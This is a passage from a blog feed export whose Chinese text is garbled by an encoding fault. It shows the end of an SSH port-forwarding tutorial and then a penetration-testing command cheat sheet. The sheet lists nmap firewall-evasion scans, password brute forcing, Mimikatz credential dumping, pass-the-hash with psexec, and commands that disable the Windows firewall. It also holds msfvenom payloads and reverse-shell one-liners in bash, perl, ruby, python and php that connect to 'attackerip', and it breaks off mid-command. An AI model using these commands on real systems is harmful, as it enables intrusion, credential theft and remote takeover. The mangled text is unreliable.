ËøôÈáåÊòØÊú¨Êú∫ËΩ¨ÂèëÂêéË¶ÅÁõëÂê¨ÁöÑipÊÆµÔºå0.0.0.0ÂÖÅËÆ∏ÊâÄÊúâipËÆøÈóÆÔºåÊú¨Êú∫ipÂÖÅËÆ∏ÂÜÖÁΩëipËÆøÈóÆÔºå127.0.0.1ÂÖÅËÆ∏Êú¨Êú∫ËÆøÈóÆBÔºöËøúÁ®ã‰∏ªÊú∫Á´ØÂè£ËΩ¨ÂèëÂà∞Êú¨Êú∫ÂêéÁöÑÁ´ØÂè£CÔºöË¶ÅËΩ¨ÂèëÁöÑËøúÁ®ã‰∏ªÊú∫ipÔºåËøôÈáåÁöÑipÂú∞ÂùÄÊòØÁõ∏ÂØπË∑≥ÊùøÊú∫ËÄåË®ÄÁöÑDÔºöË¶ÅËΩ¨ÂèëÁöÑÁ´ØÂè£EÔºöÈúÄË¶ÅÊâßË°åËΩ¨ÂèëÁöÑÊú∫Âô®ÔºåÂç≥Ë∑≥ÊùøÊú∫ 1234567-C ÂéãÁº©‰º†ËæìÊï∞ÊçÆ-f Âª∫Á´ãSSHËøûÊé•ÂêéÊîæÁΩÆÂêéÂè∞ÔºåÈùôÈªòÊ®°Âºè-N ‰∏çË¶ÅÊâßË°åËøúÁ®ãÂëΩ‰ª§„ÄÇ ËøôÂØπ‰∫é‰ªÖËΩ¨ÂèëÁ´ØÂè£ÂæàÊúâÁî®Ôºà‰ªÖÈôêÂçèËÆÆÁâàÊú¨2Ôºâ-g ÂÖÅËÆ∏ËøúÁ®ã‰∏ªÊú∫ËøûÊé•Êú¨Âú∞Á´ØÂè£ËΩ¨Âèë-L ÊåáÂÆöÊú¨Âú∞ÔºàÂÆ¢Êà∑Á´ØÔºâ‰∏ªÊú∫‰∏äÁöÑÁªôÂÆöÁ´ØÂè£Ë¶ÅËΩ¨ÂèëÂà∞ËøúÁ®ãÁ´ØÁöÑÁªôÂÆö‰∏ªÊú∫ÂíåÁ´ØÂè£„ÄÇËøôÈÄöËøáÂàÜÈÖç‰∏Ä‰∏™Â•óÊé•Â≠ó‰æ¶Âê¨Êú¨Âú∞Á´ØÂè£Ôºå ÂèØÈÄâÁªëÂÆöÂà∞ÊåáÂÆöÁöÑbind_addressÂ∑•‰Ωú„ÄÇÊØèÂΩì‰∏éÊ≠§Á´ØÂè£Âª∫Á´ãËøûÊé•Êó∂ÔºåÈÉΩ‰ºöÈÄöËøáÂÆâÂÖ®ÈÄöÈÅìËΩ¨ÂèëËøûÊé•Ôºå Âπ∂‰ªéËøúÁ®ãÊú∫Âô®ËøûÊé•Âà∞‰∏ªÊú∫Á´ØÂè£‰∏ªÊú∫Á´ØÂè£ # ËÆ∞‰ΩèÊú¨Âú∞ËΩ¨ÂèëÊó∂ÂÄôÁî®LÈÄâÈ°πÂ∞±ÂèØ‰ª•‰∫Ü ËÆøÈóÆÊµÅÁ®ãÂ¶Ç‰∏ãÔºö 1Client(C) ËÆøÈóÆTCP&gt; A:80 ÈÄöËøáSSHÈößÈÅì&gt; SSH(A) TCP&gt; B:80 ËøôÈáåÂÅöÁöÑÊòØÂú®A‰∏ªÊú∫Êú¨Âú∞ÁöÑÁ´ØÂè£ËΩ¨ÂèëÔºåÂ¶ÇÊûúÊÉ≥ÊääBÊú∫Âô®80Á´ØÂè£ËΩ¨ÂèëÂà∞Âú®CÊú∫Âô®ÁöÑ80Á´ØÂè£ Âú®CÊú∫Âô®ÊâßË°åÔºö 12345#ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@123.56.1.23 Âè™ÈúÄË¶ÅÊääÊ≠§ipÔºåÊõ¥Êç¢ÊàêAÊú∫Âô®Â§ñÁΩëipÂç≥ÂèØ#sshÁôªÈôÜA‰∏ªÊú∫ÔºåÂëäËØâA‰∏ªÊú∫ÔºåËΩ¨ÂèëB‰∏ªÊú∫Ôºà172.16.1.2Ôºâ80Á´ØÂè£ÔºåÊú¨Êú∫SSH‰∏éA‰∏ªÊú∫Âª∫Á´ãSSHÈößÈÅìËΩ¨ÂèëÂà∞Êú¨Êú∫80Á´ØÂè£#Ê≠§Êó∂Âú®A‰∏ªÊú∫ÊâßË°ånetstat -anp|grep ssh‰ºöÂ§öÂá∫Êù•‰∏ÄÊù°SSHÈößÈÅìËøõÁ®ãÔºåËøô‰∏™ÈößÈÅìÂ∞±ÊòØ‰∏éC‰∏ªÊú∫Âª∫Á´ãÁöÑ ËÆøÈóÆÊµÅÁ®ãÂ¶Ç‰∏ãÔºö 1Client(C) TCP&gt; C:80 ÈÄöËøáSSHÈößÈÅì&gt; SSH(A) TCP&gt; B:80 Âª∫ËÆÆ‰∫≤ÊâãÊìç‰ΩúÂéªËØïËØïÊâæ‰∏ãÊÑüËßâÔºÅ 0x03 ËøúÁ®ãËΩ¨Âèë Â¶ÇÂõæÔºåÂêåÊ†∑Êàë‰ª¨ÂØπCÊú∫Âô®Ê≤°ÊúâÊìç‰ΩúÊùÉÈôêÔºåDÊú∫Âô®ÊÉ≥ËÆøÈóÆCÊú∫Âô®80Á´ØÂè£Ôºå‰ΩÜÊòØÂíåCÂêå‰∏ÄÁΩëÊÆµÁöÑÊú∫Âô®ÈÉΩÊ≤°ÊúâÂ§ñÁΩëipÔºåÂè™ÊúâAÊú∫Âô®ÊúâÂ§ñÁΩë‰ΩÜÂíåCÂèà‰∏çÊòØ‰∏Ä‰∏™Â±ÄÂüüÁΩëÔºå‰∏äËäÇÊàë‰ª¨Áî®ÁöÑÊú¨Âú∞Á´ØÂè£ËΩ¨ÂèëÂú®ËøôÈáåÂ∞±‰∏çËÉΩ‰ΩøÁî®‰∫ÜÔºåÊ≠§Êó∂ËøúÁ®ãÁ´ØÂè£ËΩ¨ÂèëÂá∫Êù•‰∫Ü: ) Âú®BÊú∫Âô®ÊâßË°åÔºö 12345 ÈúÄË¶ÅËΩ¨Âèë‰∏ªÊú∫ÁöÑip(C) |ssh -CNfgR 0.0.0.0:80:172.16.1.2:80 root@123.56.2.3 | | | |ËøúÁ®ã‰∏ªÊú∫ÁõëÂê¨ÁΩëÊÆµ ËøúÁ®ã‰∏ªÊú∫ÁõëÂê¨Á´ØÂè£ ËΩ¨ÂèëÁ´ØÂè£ ËøúÁ®ã‰∏ªÊú∫(A) ÊâßË°åÂ¶Ç‰∏äÊìç‰ΩúÔºåÊ≠§Êó∂DËÆøÈóÆA‰∏ªÊú∫80Á´ØÂè£Â∞±ÂèØ‰ª•ËΩ¨ÂèëÂà∞C‰∏ªÊú∫80Á´ØÂè£B‰∏ªÊú∫ÊâÆÊºîË∑≥ÊùøÊú∫ËßíËâ≤ ËÆøÈóÆÊµÅÁ®ãÂ¶Ç‰∏ãÔºö 12Client(D) TCP&gt; A:80 SSHÈößÈÅì&gt; B TCP&gt; C:80#ÊúâÁßçÂçñÈòüÂèãÁöÑÊÑüËßâÔºöÔºâ 0x04 Âä®ÊÄÅÁ´ØÂè£ËΩ¨ÂèëÊ≠§ÊñπÊ≥ïÂ§öÁî®‰∫éÁøªÂ¢ôÔºåÊâÄÊúâÁ´ØÂè£ÁªèËøáSSHÈößÈÅìÔºåÂª∫Á´ãsocksËøûÊé•Ôºå‰∏ÄÊù°ÂëΩ‰ª§Ëá™Â∑±‰Ωì‰ºö 1ssh -qTfnN -D 7070 servername@serverIP -p sshport]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>Foward</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê∏óÈÄèÂ∑•ÂÖ∑ÂÆûÊàòÂ∫îÁî®ÂëΩ‰ª§ÂêàÈõÜ]]></title>
    <url>%2F2016%2F12%2F30%2Fkali-tools%2F</url>
    <content type="text"><![CDATA[Êú¨Êñá‰∏∫ÂõΩÂ§ñÂ§ßÁâõÊÄªÁªìËá™Â∑±Âú®Ê∏óÈÄèÊµãËØï‰∏≠Â∏∏Áî®ÁöÑ‰∏Ä‰∫õÂ∞èÊäÄÂ∑ß„ÄÇÂéüÊñáÂàÜ‰∏∫‰∏§ÈÉ®ÂàÜÔºåËøôÈáåÁøªËØëÂπ∂‰∏îÊÄªÁªìÔºåÊñπ‰æøÊü•ÈòÖ„ÄÇ NMAP Êâ´ÊèèÁ≠ñÁï•12345678910111213141516171819202122232425262728# ÈÄÇÁî®ÊâÄÊúâÂ§ßÂ∞èÁΩëÁªúÊúÄÂ•ΩÁöÑ nmap Êâ´ÊèèÁ≠ñÁï•# ‰∏ªÊú∫ÂèëÁé∞ÔºåÁîüÊàêÂ≠òÊ¥ª‰∏ªÊú∫ÂàóË°®$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt# Á´ØÂè£ÂèëÁé∞ÔºåÂèëÁé∞Â§ßÈÉ®ÂàÜÂ∏∏Áî®Á´ØÂè£# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt# Á´ØÂè£ÂèëÁé∞ÔºåÂèëÁé∞ÂÖ®ÈÉ®Á´ØÂè£Ôºå‰ΩÜ UDP Á´ØÂè£ÁöÑÊâ´Êèè‰ºöÈùûÂ∏∏ÊÖ¢$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt# ÊòæÁ§∫ TCP\UDP Á´ØÂè£$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;# ‰æ¶ÊµãÊúçÂä°ÁâàÊú¨$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt# Êâ´ÂÅöÁ≥ªÁªüÊâ´Êèè$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt# Á≥ªÁªüÂíåÊúçÂä°Ê£ÄÊµã$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt Nmap ‚Äì Ë∫≤ÈÅøÈò≤ÁÅ´Â¢ô1234567891011121314151617181920212223# ÂàÜÊÆµ$ nmap -f# ‰øÆÊîπÈªòËÆ§ MTU Â§ßÂ∞èÔºå‰ΩÜÂøÖÈ°ª‰∏∫ 8 ÁöÑÂÄçÊï∞(8,16,24,32 Á≠âÁ≠â)$ nmap --mtu 24# ÁîüÊàêÈöèÊú∫Êï∞ÈáèÁöÑÊ¨∫È™ó$ nmap -D RND:10 [target]# ÊâãÂä®ÊåáÂÆöÊ¨∫È™ó‰ΩøÁî®ÁöÑ IP$ nmap -D decoy1,decoy2,decoy3 etc.# ÂÉµÂ∞∏ÁΩëÁªúÊâ´Êèè, È¶ñÂÖàÈúÄË¶ÅÊâæÂà∞ÂÉµÂ∞∏ÁΩëÁªúÁöÑIP$ nmap -sI [Zombie IP] [Target IP]# ÊåáÂÆöÊ∫êÁ´ØÂè£Âè∑$ nmap --source-port 80 IP# Âú®ÊØè‰∏™Êâ´ÊèèÊï∞ÊçÆÂåÖÂêéËøΩÂä†ÈöèÊú∫Êï∞ÈáèÁöÑÊï∞ÊçÆ$ nmap --data-length 25 IP# MAC Âú∞ÂùÄÊ¨∫È™óÔºåÂèØ‰ª•ÁîüÊàê‰∏çÂêå‰∏ªÊú∫ÁöÑ MAC Âú∞ÂùÄ$ nmap --spoof-mac Dell/Apple/3Com IP Nmap ËøõË°å Web ÊºèÊ¥ûÊâ´Êèè12345678cd /usr/share/nmap/scripts/wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gznmap -sS -sV --script=vulscan/vulscan.nse targetnmap -sS -sV --script=vulscan/vulscan.nse ‚Äìscript-args vulscandb=scipvuldb.csv targetnmap -sS -sV --script=vulscan/vulscan.nse ‚Äìscript-args vulscandb=scipvuldb.csv -p80 targetnmap -PN -sS -sV --script=vulscan ‚Äìscript-args vulscancorrelation=1 -p80 targetnmap -sV --script=vuln targetnmap -PN -sS -sV --script=all ‚Äìscript-args vulscancorrelation=1 target ‰ΩøÁî® DIRB ÁàÜÁ†¥ÁõÆÂΩïDIRB ÊòØ‰∏Ä‰∏™‰∏ìÈó®Áî®‰∫éÁàÜÁ†¥ÁõÆÂΩïÁöÑÂ∑•ÂÖ∑ÔºåÂú® Kali ‰∏≠ÈªòËÆ§Â∑≤ÁªèÂÆâË£Ö 1dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt Patator ‚Äì ÂÖ®ËÉΩÊö¥ÂäõÁ†¥Ëß£ÊµãËØïÂ∑•ÂÖ∑1234567# git clone https://github.com/lanjelot/patator.git /usr/share/patator# SMTP ÁàÜÁ†¥$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos; ‰ΩøÁî® Fierce ÁàÜÁ†¥ DNS Ê≥®ÔºöFierce ‰ºöÊ£ÄÊü• DNS ÊúçÂä°Âô®ÊòØÂê¶ÂÖÅËÆ∏Âå∫Âüü‰º†ÈÄÅ„ÄÇÂ¶ÇÊûúÂÖÅËÆ∏ÔºåÂ∞±‰ºöËøõË°åÂå∫Âüü‰º†ÈÄÅÂπ∂ÈÄöÁü•Áî®Êà∑ÔºåÂ¶ÇÊûú‰∏çÂÖÅËÆ∏ÔºåÂàôÂèØ‰ª•ÈÄöËøáÊü•ËØ¢ DNS ÊúçÂä°Âô®Êûö‰∏æ‰∏ªÊú∫Âêç„ÄÇÁ±ª‰ººÂ∑•ÂÖ∑ÔºösubDomainsBrute Âíå SubBrute Á≠âÁ≠â 123# http://ha.ckers.org/fierce/$ ./fierce.pl -dns example.com$ ./fierce.pl ‚Äìdns example.com ‚Äìwordlist myWordList.txt ‰ΩøÁî® Nikto Êâ´Êèè Web ÊúçÂä°1nikto -C all -h http://IP Êâ´Êèè WordPress12git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan./wpscan ‚Äìurl http://IP/ ‚Äìenumerate p HTTP ÊåáÁ∫πËØÜÂà´12345wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zipcd httprint_301/linux/./httprint -h http://IP -s signatures.txt‰ΩøÁî® Skipfish Êâ´ÊèèÊ≥®ÔºöSkipfish ÊòØ‰∏ÄÊ¨æ Web Â∫îÁî®ÂÆâÂÖ®‰æ¶Êü•Â∑•ÂÖ∑ÔºåSkipfish ‰ºöÂà©Áî®ÈÄíÂΩíÁà¨Ëô´ÂíåÂü∫‰∫éÂ≠óÂÖ∏ÁöÑÊé¢ÈíàÁîüÊàê‰∏ÄÂπÖ‰∫§‰∫íÂºèÁΩëÁ´ôÂú∞ÂõæÔºåÊúÄÁªàÁîüÊàêÁöÑÂú∞Âõæ‰ºöÂú®ÈÄöËøáÂÆâÂÖ®Ê£ÄÊü•ÂêéËæìÂá∫„ÄÇ 1skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP ‰ΩøÁî® NC Êâ´Êèè12345nc -v -w 1 target -z 1-1000for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done#Âà§Êñ≠Á´ØÂè£ÊòØÂê¶ÂºÄÂêØnc -v5 -w target port Unicornscan Ê≥®ÔºöUnicornscan ÊòØ‰∏Ä‰∏™‰ø°ÊÅØÊî∂ÈõÜÂíåÂÆâÂÖ®ÂÆ°ËÆ°ÁöÑÂ∑•ÂÖ∑„ÄÇ 123456us -H -msf -Iv 192.168.56.101 -p 1-65535us -H -mU -Iv 192.168.56.101 -p 1-65535-H Âú®ÁîüÊàêÊä•ÂëäÈò∂ÊÆµËß£Êûê‰∏ªÊú∫Âêç-m Êâ´ÊèèÁ±ªÂûã (sf - tcp, U - udp)-Iv - ËØ¶ÁªÜ ‰ΩøÁî® Xprobe2 ËØÜÂà´Êìç‰ΩúÁ≥ªÁªüÊåáÁ∫π1xprobe2 -v -p tcp:80:open IP Êûö‰∏æ Samba1234nmblookup -A targetsmbclient //MOUNT/share -I target -Nrpcclient -U &quot;&quot; targetenum4linux target Êûö‰∏æ SNMP123snmpget -v 1 -c public IPsnmpwalk -v 1 -c public IPsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP PuTTY ËøûÊé•ÈößÈÅì12ËΩ¨ÂèëËøúÁ®ãÁ´ØÂè£Âà∞ÁõÆÊ†áÂú∞ÂùÄplink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP Meterpreter Á´ØÂè£ËΩ¨Âèë123# ËΩ¨ÂèëËøúÁ®ãÁ´ØÂè£Âà∞ÁõÆÊ†áÂú∞ÂùÄmeterpreter &gt; portfwd add ‚Äìl 3389 ‚Äìp 3389 ‚Äìr 172.16.194.141kali &gt; rdesktop 127.0.0.1:3389 SSH Á©øÈÄè123ssh -D 127.0.0.1:1080 -p 22 user@IPAdd socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains commands target SSH Á©øÈÄè‰ªé‰∏Ä‰∏™ÁΩëÁªúÂà∞Âè¶‰∏Ä‰∏™ÁΩëÁªú12345ssh -D 127.0.0.1:1080 -p 22 user1@IP1Add socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2Add socks4 127.0.0.1 1081 in /etc/proxychains.confproxychains commands target ‰ΩøÁî® metasploit ËøõË°åÁ©øÈÄè123456789101112131415161718route add X.X.X.X 255.255.255.0 1use auxiliary/server/socks4arunproxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP EÊàñËÄÖmeterpreter &gt; ipconfigIP Address : 10.1.13.3meterpreter &gt; run autoroute -s 10.1.13.0/24meterpreter &gt; run autoroute -p10.1.13.0 255.255.255.0 Session 1meterpreter &gt; Ctrl+Zmsf auxiliary(tcp) &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set RHOST 10.1.13.2msf exploit(psexec) &gt; exploitmeterpreter &gt; ipconfigIP Address : 10.1.13.2 ÂºÄÂêØ RDP ÊúçÂä°123reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0netsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable ÂÖ≥Èó≠ Windows Èò≤ÁÅ´Â¢ô1netsh firewall set opmode disable Meterpreter VNC\RDP12run getgui -u admin -p 1234run vnc -p 5043 ‰ΩøÁî® MimikatzËé∑Âèñ Windows ÊòéÊñáÁî®Êà∑ÂêçÂØÜÁ†Å12345678910111213141516171819202122git clone https://github.com/gentilkiwi/mimikatz.gitprivilege::debugsekurlsa::logonPasswords fullËé∑ÂèñÂìàÂ∏åÂÄºgit clone https://github.com/byt3bl33d3r/pth-toolkitpth-winexe -U hash //IP cmdÊàñËÄÖapt-get install freerdp-x11xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IPÂú®ÊàñËÄÖmeterpreter &gt; run post/windows/gather/hashdumpAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586cmsf exploit(psexec) &gt; exploitmeterpreter &gt; shell ‰ΩøÁî® Hashcat Á†¥Ëß£ÂØÜÁ†Å1hashcat -m 400 -a 0 hash /root/rockyou.txt ‰ΩøÁî® NC ÊäìÂèñ Banner ‰ø°ÊÅØ12345nc 192.168.0.10 80GET / HTTP/1.1Host: 192.168.0.10User-Agent: Mozilla/4.0Referrer: www.example.com Êü•Êâæ SUID\SGID root Êñá‰ª∂1234567891011121314151617# Êü•Êâæ SUID root Êñá‰ª∂find / -user root -perm -4000 -print# Êü•Êâæ SGID root Êñá‰ª∂:find / -group root -perm -2000 -print# Êü•Êâæ SUID Âíå SGID Êñá‰ª∂:find / -perm -4000 -o -perm -2000 -print# Êü•Êâæ‰∏çÂ±û‰∫é‰ªª‰ΩïÁî®Êà∑ÁöÑÊñá‰ª∂:find / -nouser -print# Êü•Êâæ‰∏çÂ±û‰∫é‰ªª‰ΩïÁî®Êà∑ÁªÑÁöÑÊñá‰ª∂:find / -nogroup -print# Êü•ÊâæËΩØËøûÊé•ÂèäÂÖ∂ÊåáÂêë:find / -type l -ls Ëé∑ÂèñËøõÁ®ãÂØπÂ∫îÁöÑ PID12fuser -nv tcp 80fuser -k -n tcp 80 ‰ΩøÁî® Hydra ÁàÜÁ†¥ RDP1hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp ÊåÇËΩΩËøúÁ®ã Windows ÂÖ±‰∫´Êñá‰ª∂Â§π1smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw Kali ‰∏ãÁºñËØë Exploit12gcc -m32 -o output32 hello.c (32 ‰Ωç)gcc -m64 -o output hello.c (64 ‰Ωç) Kali ‰∏ãÁºñËØë Windows Exploit12345678wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/downloadwine mingw-get-setup.exeselect mingw32-basecd /root/.wine/drive_c/windowswget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zipcd /root/.wine/drive_c/MinGW/binwine gcc -o ability.exe /tmp/exploit.c -lwsock32wine ability.exe NASM ÂëΩ‰ª§ NASM ÂÖ®Áß∞ The Netwide AssemblerÔºåÊòØ‰∏ÄÊ¨æÂü∫‰∫é80√ó86Âíåx86-64Âπ≥Âè∞ÁöÑÊ±áÁºñËØ≠Ë®ÄÁºñËØëÁ®ãÂ∫èÔºåÂÖ∂ËÆæËÆ°ÂàùË°∑ÊòØ‰∏∫‰∫ÜÂÆûÁé∞ÁºñËØëÂô®Á®ãÂ∫èË∑®Âπ≥Âè∞ÂíåÊ®°ÂùóÂåñÁöÑÁâπÊÄß„ÄÇ 12nasm -f bin -o payload.bin payload.asmnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload Âü∫‰∫é CSV Êñá‰ª∂Êü•ËØ¢ Exploit-DB1234567git clone https://github.com/offensive-security/exploit-database.gitcd exploit-database./searchsploit ‚Äìu./searchsploit apache 2.2./searchsploit &quot;Linux Kernel&quot;cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3 shell‰ΩøÁî® NC Âú® Windows ‰∏äÂèçÂºπ shell12345678c:&gt;nc -Lp 31337 -vv -e cmd.exenc 192.168.0.10 31337c:&gt;nc example.com 80 -e cmd.exenc -lp 80nc -lp 31337 -e /bin/bashnc 192.168.0.10 31337nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000 Python shell1python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; Python\Ruby\PHP HTTP ÊúçÂä°Âô®123456python2 -m SimpleHTTPServerpython3 -m http.serverruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :D ocumentRoot =&gt; Dir.pwd).start&quot;php -S 0.0.0.0:8888 1234msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exemsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.phpmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c MSF ÁîüÊàêÂú® Linux ‰∏ãÂèçÂºπÁöÑ Meterpreter Shell1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell MSF ÁîüÊàêÂèçÂºπ Shell (C Shellcode)1msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c MSF ÁîüÊàêÂèçÂºπ Python Shell1msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py MSF ÁîüÊàêÂèçÂºπ ASP Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp MSF ÁîüÊàêÂèçÂºπ Bash Shell1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh MSF ÁîüÊàêÂèçÂºπ PHP Shell123msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.phpadd &lt;?php at the beginningperl -i~ -0777pe&apos;s/^/&lt;?php \n/&apos; shell.php MSF ÁîüÊàêÂèçÂºπ Win Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe BASH ÂèçÂºπ Shell1234567891011121314151617bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1exec /bin/bash 0&amp;0 2&gt;&amp;0exec /bin/bash 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;1960&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; doneexec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1 PERL ÂèçÂºπ Shell12345perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;# Win Âπ≥Âè∞perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;‚Äô RUBY ÂèçÂºπ Shell12345ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;# Win Âπ≥Âè∞ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; PYTHON ÂèçÂºπ Shell1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP ÂèçÂºπ Shell1php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 